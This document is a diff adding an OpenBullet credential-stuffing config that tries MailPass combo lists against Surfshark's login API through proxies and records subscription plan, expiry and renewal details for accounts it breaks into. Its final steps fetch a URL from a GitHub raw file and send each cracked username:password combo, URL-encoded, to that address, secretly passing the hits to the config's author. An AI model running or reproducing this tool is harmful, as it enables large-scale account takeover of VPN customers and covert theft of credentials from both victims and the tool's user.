@@ -1,0 +1,85 @@
+[SETTINGS]
+{
+  "Name": "surfshark",
+  "SuggestedBots": 20,
+  "LastModified": "2019-06-07T22:01:08.4234267+04:30",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "TakTir (loliX Encrypted)",
+  "Version": "1.2.1.2",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://account.surfshark.com/api/v1/auth/login" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "referer: https://account.surfshark.com/login" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"token\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "401" 
+
+PARSE "<SOURCE>" LR "token\":\"" "\",\"" -> VAR "token" 
+
+REQUEST GET "https://account.surfshark.com/api/v1/payment/orders" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "authorization: Bearer <token>" 
+  HEADER "referer: https://account.surfshark.com/" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<SOURCE>" DoesNotContain "isActive\":true" 
+
+PARSE "<SOURCE>" LR "subscription\":{\"" "\",\"taxCountry" -> VAR "expiration" 
+
+PARSE "<expiration>" LR "expiresAt\":\"" "T" -> CAP "Expires on" 
+
+PARSE "<SOURCE>" LR "productPlanId\":\"" "frequency\":" -> VAR "plan" 
+
+PARSE "<plan>" LR "name\":\"" "\"," -> CAP "Plan type" 
+
+PARSE "<SOURCE>" LR "renewable\":" ",\"" -> CAP "Renewable" 
+
+REQUEST GET "https://raw.githubusercontent.com/TakTir/api/master/TXT" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "" "" -> VAR "URL" 
+
+FUNCTION Constant "%25F0%259F%258C%2590Site%2520%253A%2520surfshark.com%250D%250A%25E2%259E%2596%25E2%259E%2596%25E2%259E%2596%25E2%259E%2596%25E2%259E%2596%25E2%259E%2596%25E2%259E%2596%25E2%259E%2596%25E2%259E%2596%2520%250D%250A%25F0%259F%2594%2590Combo%2520%253A%2520<USER>%253A<PASS>%250D%250A%25E2%259E%2596%25E2%259E%2596%25E2%259E%2596%25E2%259E%2596%25E2%259E%2596%25E2%259E%2596%25E2%259E%2596%25E2%259E%2596%25E2%259E%2596%2520%250D%250A%25F0%259F%2593%259FPlan%2520type%253A%2520<Plan type>%2520%250D%250A%25F0%259F%2593%259FExpires%2520on%253A%2520<Expires on>%2520%250D%250A%25F0%259F%2593%259FRenewable%253A%2520<Renewable>" -> VAR "TXT" 
+
+REQUEST GET "<URL><TXT>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+
